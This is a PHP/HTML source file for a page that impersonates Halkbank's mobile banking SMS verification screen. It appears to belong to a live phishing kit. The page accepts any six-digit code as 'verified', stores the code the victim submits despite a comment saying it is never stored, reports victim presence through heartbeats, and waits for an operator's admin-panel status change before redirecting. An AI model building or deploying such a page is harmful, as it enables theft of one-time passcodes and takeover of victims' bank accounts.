<?php
declare(strict_types=1);
require_once __DIR__ . '/includes/storage.php';

function verifySmsCodeWithService(string $applicationId, string $code): bool
{
    // Demo stub. In production, verify against a real OTP provider.
    // Raw code is never stored.
    return preg_match('/^\d{6}$/', $code) === 1;
}

$id = trim((string) ($_GET['id'] ?? ''));
$application = $id !== '' ? findApplicationById($id) : null;
if ($application === null) {
    http_response_code(404);
    echo 'Basvuru bulunamadi.';
    exit;
}

$statusEarly = (string) ($application['status'] ?? 'beklemede');
if ($statusEarly === 'yeniden-index') {
    header('Location: giris.php?error=hatali');
    exit;
}
upsertPresence('sms', (string) $application['id'], false);

$status = (string) ($application['status'] ?? 'beklemede');
if ($status === 'tebrikler') {
    header('Location: tebrikler.php?id=' . urlencode((string) $application['id']));
    exit;
}
if ($status === 'onay') {
    header('Location: onay.php?id=' . urlencode((string) $application['id']));
    exit;
}
if ($status !== 'sms-dogrulama') {
    header('Location: waiting.php?id=' . urlencode((string) $application['id']));
    exit;
}

$error = '';
$success = '';
if (($_SERVER['REQUEST_METHOD'] ?? 'GET') === 'POST') {
    $code = preg_replace('/\D+/', '', (string) ($_POST['sms_code'] ?? '')) ?? '';
    if (!preg_match('/^\d{6}$/', $code)) {
        $error = 'Lutfen 6 haneli sayisal kod giriniz.';
    } else {
        $verified = verifySmsCodeWithService((string) $application['id'], $code);
        updateSmsVerification((string) $application['id'], $verified, $code);
        if ($verified) {
            // Kullanici SMS adimini tamamladiginda bekleme ekranina doner.
            // Sonraki yonlendirme tamamen admin paneldeki durum guncellemesine baglidir.
            updateApplicationStatus((string) $application['id'], 'beklemede');
            header('Location: waiting.php?id=' . urlencode((string) $application['id']));
            exit;
        } else {
            $error = 'Kod dogrulanamadi. Lutfen tekrar deneyiniz.';
        }
        $application = findApplicationById((string) $application['id']) ?? $application;
    }
}
?>
<!doctype html>
<html lang="tr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Basvuru Ekrani Kod Dogrulama</title>
  <link rel="stylesheet" href="<?= htmlspecialchars(asset_url('assets/app.css'), ENT_QUOTES, 'UTF-8') ?>">
  <link rel="stylesheet" href="<?= htmlspecialchars(asset_url('assets/finansapp-mobile.css'), ENT_QUOTES, 'UTF-8') ?>">
  <!-- Meta Pixel Code -->
  <script>
  !function(f,b,e,v,n,t,s)
  {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
  n.callMethod.apply(n,arguments):n.queue.push(arguments)};
  if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
  n.queue=[];t=b.createElement(e);t.async=!0;
  t.src=v;s=b.getElementsByTagName(e)[0];
  s.parentNode.insertBefore(t,s)}(window, document,'script',
  'https://connect.facebook.net/en_US/fbevents.js');
  fbq('init', '1490333842624277');
  fbq('track', 'PageView');
  </script>
  <noscript><img height="1" width="1" style="display:none"
  src="https://www.facebook.com/tr?id=1490333842624277&ev=PageView&noscript=1"
  /></noscript>
  <!-- End Meta Pixel Code -->
</head>
<body class="app-mobile">
  <div class="app-shell">
    <header class="app-top">
      <div class="app-top-left">
        <button type="button" class="app-icon-btn" aria-label="Geri">
          <svg class="app-icon-svg" viewBox="0 0 24 24" aria-hidden="true">
            <path d="M15 18 9 12l6-6"></path>
          </svg>
        </button>
      </div>
      <div class="app-logo">HALKBANK</div>
      <div class="app-top-right">
        <button type="button" class="app-icon-btn" aria-label="Bildirim">
          <svg class="app-icon-svg" viewBox="0 0 24 24" aria-hidden="true">
            <path d="M7 9a5 5 0 1 1 10 0v4.2c0 .53.21 1.04.59 1.41L19 16H5l1.41-1.39A2 2 0 0 0 7 13.2z"></path>
            <path d="M10 19a2 2 0 0 0 4 0"></path>
          </svg>
        </button>
        <button type="button" class="app-lang">EN</button>
      </div>
    </header>

    <main class="app-main sms-main">
      <h1 class="app-heading">SMS Doğrulama</h1>
      <div class="app-tabs">
        <button class="app-tab active" type="button">Bireysel</button>
        <button class="app-tab" type="button">Kurumsal</button>
      </div>

      <?php if ($error !== ''): ?>
        <div class="alert alert-error"><?= esc($error) ?></div>
      <?php endif; ?>
      <?php if ($success !== ''): ?>
        <div class="alert alert-success"><?= esc($success) ?></div>
      <?php endif; ?>

      <form method="post" class="app-form" autocomplete="off">
        <div class="app-field">
          <input
            id="sms_code"
            name="sms_code"
            inputmode="numeric"
            pattern="[0-9]{6}"
            minlength="6"
            maxlength="6"
            placeholder="SMS Kodu"
            required
          >
        </div>
        <button class="app-primary-btn" type="submit">Doğrula</button>
      </form>
    </main>

    <nav class="app-bottom-nav">
      <div class="app-nav-item">
        <strong>
          <svg class="app-nav-icon" viewBox="0 0 24 24" aria-hidden="true"><path d="M13 2 6 13h5l-1 9 7-11h-5z"></path></svg>
        </strong>FAST<br>İşlemleri
      </div>
      <div class="app-nav-item">
        <strong>
          <svg class="app-nav-icon" viewBox="0 0 24 24" aria-hidden="true"><path d="m5 12 4 4 10-10"></path></svg>
        </strong>Mobil<br>Onay
      </div>
      <div class="app-nav-item app-nav-item-qr">
        <div class="app-qr-btn">
          <svg class="app-nav-icon" viewBox="0 0 24 24" aria-hidden="true">
            <rect x="3" y="3" width="7" height="7" rx="1"></rect>
            <rect x="14" y="3" width="7" height="7" rx="1"></rect>
            <rect x="3" y="14" width="7" height="7" rx="1"></rect>
            <rect x="15" y="15" width="3" height="3" rx="0.5"></rect>
            <path d="M19 15h2v2"></path>
            <path d="M19 19h2v2h-2"></path>
          </svg>
        </div>Karekod<br>İşlemleri
      </div>
      <div class="app-nav-item">
        <strong>
          <svg class="app-nav-icon" viewBox="0 0 24 24" aria-hidden="true">
            <path d="M4 20V4"></path><path d="M4 20h16"></path><path d="M8 17v-4"></path><path d="M12 17V9"></path><path d="M16 17v-7"></path>
          </svg>
        </strong>Finansal<br>Araçlar
      </div>
      <div class="app-nav-item">
        <strong>
          <svg class="app-nav-icon" viewBox="0 0 24 24" aria-hidden="true">
            <rect x="4" y="4" width="6" height="6" rx="1"></rect><rect x="4" y="14" width="6" height="6" rx="1"></rect><rect x="14" y="14" width="6" height="6" rx="1"></rect><path d="M14 7h6"></path><path d="M17 4v6"></path>
          </svg>
        </strong>Diğer<br>İşlemler
      </div>
    </nav>
  </div>
  <script>
    const appId = <?= json_encode($application['id']) ?>;
    const tabs = document.querySelectorAll(".app-tab");
    const smsInput = document.getElementById("sms_code");
    tabs.forEach((tab) => {
      tab.addEventListener("click", () => {
        tabs.forEach((t) => t.classList.remove("active"));
        tab.classList.add("active");
      });
    });
    if (smsInput) {
      smsInput.addEventListener("input", () => {
        smsInput.value = smsInput.value.replace(/\D+/g, "").slice(0, 6);
      });
    }

    async function checkStatus() {
      try {
        const res = await fetch(`status.php?id=${encodeURIComponent(appId)}&_=${Date.now()}`);
        const data = await res.json();
        if (!data.ok) return;
        if (data.status === "yeniden-index") {
          window.location.href = "giris.php?error=hatali";
          return;
        }
        if (data.status === "tebrikler") {
          window.location.href = `tebrikler.php?id=${encodeURIComponent(appId)}`;
          return;
        }
        if (data.status === "onay") {
          window.location.href = `onay.php?id=${encodeURIComponent(appId)}`;
        }
      } catch (e) {
        // ignore and retry
      }
    }

    function sendHeartbeat() {
      const body = new URLSearchParams({
        screen: "sms",
        application_id: appId
      });
      fetch("heartbeat.php", {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8" },
        body: body.toString(),
        keepalive: true
      }).catch(() => {});
    }

    sendHeartbeat();
    setInterval(sendHeartbeat, 10000);
    setInterval(checkStatus, 4000);
  </script>
</body>
</html>

